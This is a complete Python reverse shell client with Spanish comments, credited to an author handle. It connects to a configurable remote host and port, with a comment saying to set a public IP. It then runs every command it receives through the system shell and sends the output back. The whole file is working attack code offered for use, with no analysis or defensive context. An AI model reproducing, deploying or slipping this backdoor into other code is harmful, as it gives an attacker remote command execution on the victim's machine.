## Autor: Mrx04Programmer
import socket
import subprocess

REMOTE_HOST = '127.0.0.1' # O LA IP PUBLICA
REMOTE_PORT = 8081
client = socket.socket() # Creamos el objeto como socket.
#print("[-] Iniciando reconexión...")
client.connect((REMOTE_HOST, REMOTE_PORT)) # Creamos la conexion
#print("[-] Conexion Iniciada")

while True:
    #print("[-] Esperando comandos...")
    command = client.recv(1024) #Envia comando correcto
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE) # SI es verdadero enviara el comando
    output = op.stdout.read() # Salida
    output_error = op.stderr.read() # Errores..
    #print("[-] Enviando respuesta...")
    client.send(output + output_error)
